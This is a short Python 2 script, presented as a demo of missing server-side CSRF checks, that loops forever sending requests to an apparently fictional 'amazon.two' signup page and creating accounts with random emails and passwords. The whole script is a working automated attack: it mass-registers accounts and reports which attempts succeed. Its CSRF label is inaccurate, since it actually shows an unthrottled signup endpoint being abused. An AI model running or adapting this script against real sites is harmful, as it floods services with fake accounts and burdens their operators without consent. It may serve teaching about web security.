#!/usr/bin/python
'''Demo for what can go wrong if there is no
CSRF check on the server side'''

import urllib2
import string
import random

while True:
	lst = [random.choice(string.ascii_letters + string.digits) for n in xrange(30)]
	randEmail = "".join(lst)
	lst = [random.choice(string.ascii_letters + string.digits) for n in xrange(30)]
	randPassword = "".join(lst)
	url='http://amazon.two/createaccount.php'
	url = url + '?email=' + randEmail
	url = url + '&password=' + randPassword
	url = url + '&submitacc=Create'
	req = urllib2.Request(url)
	req.add_header('Accept', 'text/html')
	req.add_header("Content-type", "application/x-www-form-urlencoded")
	res = urllib2.urlopen(req)
	reqGot = res.read()
	if reqGot.find("Account created") == -1:
		print "Fail"
	else:
		print "Account created"
